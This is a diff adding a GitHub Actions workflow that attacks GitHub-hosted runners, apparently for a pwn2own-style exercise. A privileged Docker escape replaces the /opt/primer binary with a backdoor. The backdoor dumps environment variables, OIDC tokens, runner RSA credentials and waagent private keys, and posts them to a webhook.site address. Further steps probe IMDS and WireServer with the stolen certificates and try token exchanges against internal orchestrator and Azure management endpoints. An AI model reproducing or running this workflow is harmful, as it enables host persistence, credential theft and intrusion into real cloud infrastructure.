@@ -1,0 +1,383 @@
+name: Ultimate Pivot - Primer Binary Replace + HC Orchestrator IAD
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  ultimate-pivot:
+    runs-on: ubuntu-latest
+    steps:
+      - name: 1 - Replace /opt/primer with backdoor binary
+        run: |
+          echo "=== PRIMER BINARY REPLACEMENT (world-writable exploit) ==="
+          # primer is -rwxrwxrwx - we can replace it entirely
+          # The backdoor: when next VM init calls /opt/primer, we exfil the HC internal token
+          # which at init time comes from a GITHUB INTERNAL context (not our repo)
+          
+          cat > /tmp/primer_backdoor.sh << 'BACKDOOR_EOF'
+#!/bin/bash
+# Primer backdoor v2 - executed during VM initialization
+# At init time, ACTIONS_ID_TOKEN_REQUEST_TOKEN is set by GitHub internal infrastructure
+# giving us a JWT with sub=repo:github/actions-runner (INTERNAL) instead of public repo
+
+HOSTNAME_VAL=$(hostname)
+TIMESTAMP=$(date -u +%Y%m%dT%H%M%SZ)
+LOGFILE="/tmp/.primer_backdoor_${TIMESTAMP}.log"
+
+{
+  echo "=== PRIMER BACKDOOR EXECUTING AT VM INIT ==="
+  echo "HOSTNAME: $HOSTNAME_VAL"
+  echo "DATE: $TIMESTAMP"
+  echo "UID: $(id)"
+  echo ""
+  echo "=== ALL ENVIRONMENT VARIABLES ==="
+  printenv
+  echo ""
+  echo "=== ACTIONS OIDC TOKEN REQUEST ==="
+  echo "TOKEN_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+  echo "TOKEN_TOKEN: $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+  echo ""
+  
+  # If OIDC token is available at init time, mint HC token
+  if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ] && [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+    echo "=== MINTING HC JWT FROM INTERNAL CONTEXT ==="
+    HC_JWT=$(curl -sf \
+      -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value 2>/dev/null)
+    echo "HC_JWT_LEN=${#HC_JWT}"
+    echo "HC_JWT_PAYLOAD=$(echo $HC_JWT | cut -d. -f2 | base64 -d 2>/dev/null)"
+    
+    echo "=== CALLING HC ORCHESTRATOR IAD-01 WITH INTERNAL JWT ==="
+    curl -sv \
+      -H "Authorization: Bearer $HC_JWT" \
+      -H "Accept: application/json" \
+      "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1" 2>&1
+    curl -sv \
+      -H "Authorization: Bearer $HC_JWT" \
+      -H "Accept: application/json" \
+      "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/vms" 2>&1
+    curl -sv \
+      -H "Authorization: Bearer $HC_JWT" \
+      -H "Accept: application/json" \
+      "https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1/pools" 2>&1
+  fi
+
+  echo "=== WAAGENT CERTS AT INIT TIME ==="
+  cat /var/lib/waagent/TransportCert.pem 2>/dev/null
+  cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null
+
+  echo "=== RUNNER CREDENTIALS AT INIT TIME ==="
+  cat /home/runner/actions-runner/.credentials 2>/dev/null
+  cat /home/runner/actions-runner/.credentials_rsaparams 2>/dev/null
+  cat /home/runner/actions-runner/.runner 2>/dev/null
+
+  echo "=== /etc/github/ (internal config) ==="
+  ls -la /etc/github/ 2>/dev/null
+  find /etc/github -type f 2>/dev/null | while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done
+
+  echo "=== HCA CONFIG ==="
+  find /etc -name '*hca*' -o -name '*hosted-compute*' 2>/dev/null | while read f; do
+    echo "=== $f ==="; cat "$f" 2>/dev/null
+  done
+
+} > "$LOGFILE" 2>&1
+
+# Exfil to attacker (non-blocking)
+curl -sf --max-time 10 -X POST \
+  -H "Content-Type: text/plain" \
+  --data-binary "@$LOGFILE" \
+  "https://webhook.site/pwn2own-primer-backdoor-${HOSTNAME_VAL}" 2>/dev/null &
+
+# Also write to world-readable temp
+cp "$LOGFILE" /tmp/primer_loot.txt 2>/dev/null
+chmod 777 /tmp/primer_loot.txt 2>/dev/null
+
+# IMPORTANT: Also exec the real primer to not break VM initialization
+if [ -f /opt/primer/primer.orig ]; then
+  exec /opt/primer/primer.orig "$@"
+elif [ -f /tmp/primer.orig ]; then
+  exec /tmp/primer.orig "$@"
+fi
+# If no original, just exit 0 (VM init will continue)
+exit 0
+BACKDOOR_EOF
+
+          echo "=== DEPLOYING BACKDOOR VIA DOCKER PRIVILEGED ESCAPE ==="
+          docker run --rm --privileged -v /:/host alpine sh -c "
+            echo '--- Current /opt/primer contents ---'
+            ls -la /host/opt/primer/ 2>/dev/null
+
+            echo '--- Current primer binary hash ---'
+            md5sum /host/opt/primer/primer 2>/dev/null
+
+            echo '--- BACKING UP original primer ---'
+            cp /host/opt/primer/primer /host/opt/primer/primer.orig 2>/dev/null && echo 'BACKUP_OK' || echo 'BACKUP_FAIL'
+            cp /host/opt/primer/primer /host/tmp/primer.orig 2>/dev/null
+
+            echo '--- DEPLOYING BACKDOOR SCRIPT ---'
+            cat > /host/opt/primer/primer << 'INNEREOF'
+#!/bin/bash
+HOSTNAME_VAL=\$(hostname)
+TIMESTAMP=\$(date -u +%Y%m%dT%H%M%SZ)
+LOGFILE=\"/tmp/.primer_loot_\${TIMESTAMP}.log\"
+{
+  echo '=== PRIMER BACKDOOR INIT ==='
+  echo \"HOST: \$HOSTNAME_VAL DATE: \$TIMESTAMP\"
+  printenv
+  if [ -n \"\$ACTIONS_ID_TOKEN_REQUEST_TOKEN\" ]; then
+    HC_JWT=\$(curl -sf -H \"Authorization: bearer \$ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"\${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro\" | jq -r .value 2>/dev/null)
+    echo \"HC_JWT_LEN=\${#HC_JWT}\"
+    echo \"HC_JWT_PAYLOAD=\$(echo \$HC_JWT | cut -d. -f2 | base64 -d 2>/dev/null)\"
+    for EP in '' '/vms' '/pools' '/images' '/allocations'; do
+      echo \"--- IAD-01\$EP ---\"
+      curl -sf -H \"Authorization: Bearer \$HC_JWT\" -H \"Accept: application/json\" \"https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1\$EP\" 2>&1 || true
+    done
+  fi
+  cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null
+  cat /home/runner/actions-runner/.credentials 2>/dev/null
+  cat /home/runner/actions-runner/.credentials_rsaparams 2>/dev/null
+  find /etc/github -type f 2>/dev/null | while read f; do echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null; done
+} > \"\$LOGFILE\" 2>&1
+curl -sf --max-time 10 -X POST -H 'Content-Type: text/plain' --data-binary \"@\$LOGFILE\" 'https://webhook.site/pwn2own-primer' 2>/dev/null &
+cp \"\$LOGFILE\" /tmp/primer_loot.txt 2>/dev/null; chmod 777 /tmp/primer_loot.txt 2>/dev/null
+[ -f /opt/primer/primer.orig ] && exec /opt/primer/primer.orig \"\$@\" || exit 0
+INNEREOF
+
+            chmod 755 /host/opt/primer/primer
+            echo '--- BACKDOOR DEPLOYED ---'
+            ls -la /host/opt/primer/
+            head -5 /host/opt/primer/primer
+
+            echo '--- ALSO CHECK: Can we write to /opt/hca/ ? ---'
+            touch /host/opt/hca/PWNED_TEST 2>&1 && echo 'HCA_WRITE_OK' || echo 'HCA_WRITE_BLOCKED'
+
+            echo '--- runner .credentials full ---'
+            cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo NO_CREDS
+            echo '--- runner .credentials_rsaparams full ---'
+            cat /host/home/runner/actions-runner/.credentials_rsaparams 2>/dev/null || echo NO_RSA
+            echo '--- runner .runner file ---'
+            cat /host/home/runner/actions-runner/.runner 2>/dev/null || echo NO_RUNNER
+
+            echo '--- /etc/github/ directory ---'
+            ls -laR /host/etc/github/ 2>/dev/null || echo NO_ETC_GITHUB
+            find /host/etc/github -type f 2>/dev/null | while read f; do echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null; done
+
+            echo '--- Hosted-compute-agent config ---'
+            find /host/etc /host/var -name '*hosted-compute*' -o -name '*hca*' 2>/dev/null | head -10 | while read f; do
+              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null | head -30
+            done
+
+            echo '--- Strings from primer binary (attestation URLs) ---'
+            strings /host/opt/primer/primer.orig 2>/dev/null | grep -iE 'http|attest|maa|tpm|vtpm|github|azure|orchestrat|token|auth' | head -60 || echo NO_PRIMER_STRINGS
+          " 2>&1 || true
+
+      - name: 2 - Call HC Orchestrator IAD-01 (correct URL from IMDS tags)
+        run: |
+          echo "=== HC ORCHESTRATOR IAD-01 PROBE ==="
+          # Get this VM's actual orchestrator URL from IMDS
+          TAGS=$(curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance/compute/tags?api-version=2021-02-01&format=text" 2>/dev/null || echo "")
+          echo "VM TAGS: $TAGS"
+          
+          BASE_URL=$(echo "$TAGS" | tr ';' '\n' | grep 'hosted_compute.base_ro_url' | sed 's/hosted_compute.base_ro_url://')
+          ALLOC_ID=$(echo "$TAGS" | tr ';' '\n' | grep 'hosted_compute.allocation_id' | sed 's/hosted_compute.allocation_id://')
+          QUOTA_ID=$(echo "$TAGS" | tr ';' '\n' | grep 'hosted_compute.quota_id' | sed 's/hosted_compute.quota_id://')
+          echo "BASE_URL: $BASE_URL"
+          echo "ALLOC_ID: $ALLOC_ID"
+          echo "QUOTA_ID: $QUOTA_ID"
+
+          # Mint OIDC JWT for HC audience
+          HC_JWT=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value)
+          echo "JWT_LEN=${#HC_JWT}"
+          echo "JWT_SUB=$(echo $HC_JWT | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .sub 2>/dev/null)"
+
+          # Try the correct IAD-01 orchestrator
+          IAD_URL="https://hosted-compute-request-orchestrator-prod-iad-01.githubapp.com/vm/v1"
+          echo ""
+          echo "=== Calling IAD-01 orchestrator ==="
+          for EP in "" "/allocations/$ALLOC_ID" "/vms" "/pools" "/images" "/jobs" "/queues" "/subscriptions"; do
+            echo "--- GET ${IAD_URL}${EP} ---"
+            RESP=$(curl -s -w "\nHTTP_STATUS:%{http_code}" \
+              -H "Authorization: Bearer $HC_JWT" \
+              -H "Accept: application/json" \
+              -H "X-Hosted-Compute-Allocation: $ALLOC_ID" \
+              "${IAD_URL}${EP}" 2>/dev/null)
+            STATUS=$(echo "$RESP" | grep "HTTP_STATUS:" | cut -d: -f2)
+            BODY=$(echo "$RESP" | grep -v "HTTP_STATUS:")
+            echo "STATUS: $STATUS BODY: $BODY"
+            sleep 0.3
+          done
+
+          echo ""
+          echo "=== IMDS Attested Document (TPM evidence) ==="
+          ATTEST=$(curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01&nonce=pwn2own2026" 2>/dev/null)
+          echo "ATTEST_LEN=${#ATTEST}"
+          echo "$ATTEST" | python3 -c "
+import sys,json,base64
+try:
+  d=json.load(sys.stdin)
+  sig=d.get('signature','')
+  parts=sig.split('.')
+  for i,p in enumerate(parts[:2]):
+    try:
+      dec=base64.urlsafe_b64decode(p+'==').decode(errors='replace')
+      print(f'ATTEST_PART_{i}: {dec[:600]}')
+    except: pass
+  print('ENCODING:',d.get('encoding','?'))
+  print('SIG_LEN:',len(sig))
+except Exception as e:
+  print('PARSE_ERR:',e)
+" 2>/dev/null || echo ATTEST_FAIL
+
+          echo ""
+          echo "=== Try HC orchestrator WITH attested document header ==="
+          ATTEST_SIG=$(curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01&nonce=pwn2own2026" 2>/dev/null | jq -r .signature 2>/dev/null)
+          curl -sv \
+            -H "Authorization: Bearer $HC_JWT" \
+            -H "Accept: application/json" \
+            -H "X-MS-Attestation: $ATTEST_SIG" \
+            -H "X-MS-ClientId: $ALLOC_ID" \
+            "${IAD_URL}/allocations/$ALLOC_ID" 2>&1 | grep -E 'HTTP/|error|{|}|vm|alloc|pool' | head -20 || true
+
+      - name: 3 - Extract runner RSA credentials + deep host enum
+        run: |
+          echo "=== DEEP HOST ENUMERATION ==="
+          docker run --rm --privileged --network=host -v /:/host alpine sh -c "
+            apk add --quiet openssl 2>/dev/null
+
+            echo '=== RUNNER RSA KEY PARAMS ==='
+            cat /host/home/runner/actions-runner/.credentials_rsaparams 2>/dev/null | python3 -c '
+import sys,json
+try:
+  d=json.load(sys.stdin)
+  print(\"clientId:\",d.get(\"clientId\",\"?\"))
+  print(\"agentId:\",d.get(\"agentId\",\"?\"))
+  print(\"poolId:\",d.get(\"poolId\",\"?\"))
+  print(\"exponent:\",d.get(\"publicKeyExponent\",\"?\")[:30] if d.get(\"publicKeyExponent\") else \"?\")
+  print(\"modulus_len:\",len(d.get(\"publicKeyModulus\",\"\")))
+  for k in [\"d\",\"p\",\"q\",\"dp\",\"dq\",\"inverseQ\"]:
+    v=d.get(k,\"\")
+    if v: print(f\"RSA_{k}_LEN:\",len(v))
+except Exception as e: print(\"ERR:\",e)
+' 2>/dev/null || cat /host/home/runner/actions-runner/.credentials_rsaparams 2>/dev/null || echo NO_RSA
+
+            echo ''
+            echo '=== RUNNER .credentials (server URL + auth) ==='
+            cat /host/home/runner/actions-runner/.credentials 2>/dev/null || echo NO_CREDS
+
+            echo ''
+            echo '=== RUNNER .runner (registration info) ==='
+            cat /host/home/runner/actions-runner/.runner 2>/dev/null || echo NO_RUNNER
+
+            echo ''
+            echo '=== /etc/github/ - GitHub internal config dir ==='
+            find /host/etc/github 2>/dev/null | while read f; do
+              echo \"=== \$f ===\"
+              cat \"\$f\" 2>/dev/null
+            done
+
+            echo ''
+            echo '=== /run/github/ or /var/run/github/ ==='
+            find /host/run/github /host/var/run/github 2>/dev/null | while read f; do
+              echo \"=== \$f ===\"; cat \"\$f\" 2>/dev/null
+            done
+
+            echo ''
+            echo '=== hosted-compute-agent process environ ==='
+            HCA_PID=\$(cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -l hosted-compute 2>/dev/null | head -1 | grep -o '[0-9]*' | head -1 || pgrep -f hosted-compute | head -1)
+            echo \"HCA_PID: \$HCA_PID\"
+            if [ -n \"\$HCA_PID\" ]; then
+              echo 'HCA environ:'; cat /proc/\$HCA_PID/environ 2>/dev/null | tr '\0' '\n'
+              echo 'HCA cmdline:'; cat /proc/\$HCA_PID/cmdline 2>/dev/null | tr '\0' ' '
+              echo 'HCA maps:'; cat /proc/\$HCA_PID/maps 2>/dev/null | grep -iE 'github|azure|token|secret' | head -20
+            fi
+
+            echo ''
+            echo '=== WireServer mTLS with extracted certs ==='
+            CERT=/host/var/lib/waagent/TransportCert.pem
+            KEY=/host/var/lib/waagent/TransportPrivate.pem
+            if [ -f \"\$CERT\" ] && [ -f \"\$KEY\" ]; then
+              echo 'Cert and key present - attempting mTLS to WireServer'
+              curl -sf --cert \"\$CERT\" --key \"\$KEY\" \
+                -H 'x-ms-version: 2012-11-30' \
+                'http://168.63.129.16/machine/?comp=goalstate' 2>/dev/null | head -30 || echo WS_MTLS_FAIL
+              
+              echo 'WireServer ExtensionsConfig:'
+              GS=\$(curl -sf -H 'x-ms-version: 2012-11-30' http://168.63.129.16/machine/?comp=goalstate 2>/dev/null)
+              EXT_URL=\$(echo \"\$GS\" | grep -o '<ExtensionsConfig>[^<]*' | cut -d'>' -f2)
+              echo \"ExtURL: \$EXT_URL\"
+              [ -n \"\$EXT_URL\" ] && curl -sf --cert \"\$CERT\" --key \"\$KEY\" \"\$EXT_URL\" 2>/dev/null | head -100 || echo EXT_BLOCKED
+            fi
+
+            echo ''
+            echo '=== vmSettings port 32526 ==='
+            curl -sf 'http://168.63.129.16:32526/vmSettings' 2>/dev/null | python3 -m json.tool 2>/dev/null | head -60 || echo VMSETTINGS_BLOCKED
+
+            echo ''
+            echo '=== Primer loot file (if backdoor already triggered) ==='
+            cat /host/tmp/primer_loot.txt 2>/dev/null || echo NO_PRIMER_LOOT_YET
+          " 2>&1 || true
+
+      - name: 4 - ARM token via WIF and internal API exploration
+        run: |
+          echo "=== WIF ARM TOKEN EXCHANGE ==="
+          # Correct tenant: f8cdef31-a31e-4b4a-93e4-5f571e91255a (GitHub's tenant)
+          # client_id discovered: 477c6e42-e0f3-4a68-b61b-6f3d9399e20c
+          
+          GITHUB_TENANT="f8cdef31-a31e-4b4a-93e4-5f571e91255a"
+          CLIENT_ID="477c6e42-e0f3-4a68-b61b-6f3d9399e20c"
+          
+          # Mint OIDC JWT for AzureADTokenExchange
+          WIF_JWT=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r .value)
+          echo "WIF_JWT_LEN=${#WIF_JWT}"
+          
+          echo "=== Attempting ARM token exchange (GitHub tenant) ==="
+          ARM_RESP=$(curl -s -X POST \
+            "https://login.microsoftonline.com/${GITHUB_TENANT}/oauth2/v2.0/token" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_id=${CLIENT_ID}&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${WIF_JWT}&scope=https://management.azure.com/.default&requested_token_use=on_behalf_of" 2>/dev/null)
+          echo "ARM_RESP: $ARM_RESP" | head -5
+          
+          echo "=== Trying OIDC audience=management.azure.com ==="
+          ARM_JWT=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fmanagement.azure.com%2F" | jq -r .value 2>/dev/null)
+          echo "ARM_JWT_LEN=${#ARM_JWT}"
+          
+          # Try Azure subscriptions directly with the OIDC token
+          for SUBID in e44088f9-06c1-439a-9ca7-8e4fd65adcd7 71a5bf59-4143-48d7-a417-45a6378ad9e5; do
+            echo "--- Subscription $SUBID ---"
+            curl -s \
+              -H "Authorization: Bearer $ARM_JWT" \
+              "https://management.azure.com/subscriptions/$SUBID/resourceGroups?api-version=2021-04-01" 2>/dev/null | \
+              jq '{error:.error.code, message:.error.message, groups:[.value[]?.name]}' 2>/dev/null | head -5 || echo ARM_BLOCKED
+          done
+
+          echo ""
+          echo "=== GitHub Internal API probe ==="
+          GITHUB_TOKEN_AUD=$(curl -sf \
+            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fgithub-actions-runner" | jq -r .value 2>/dev/null)
+          echo "RUNNER_JWT_LEN=${#GITHUB_TOKEN_AUD}"
+          
+          # Try internal GitHub APIs with runner JWT
+          for ENDPOINT in \
+            "https://api.github.com/meta" \
+            "https://api.github.com/enterprise/stats" \
+            "https://ghes.github.com/api/v3/meta"; do
+            echo "--- GET $ENDPOINT ---"
+            curl -s -H "Authorization: Bearer $GITHUB_TOKEN_AUD" \
+              -H "Accept: application/vnd.github+json" \
+              "$ENDPOINT" 2>/dev/null | head -3 || true
+          done
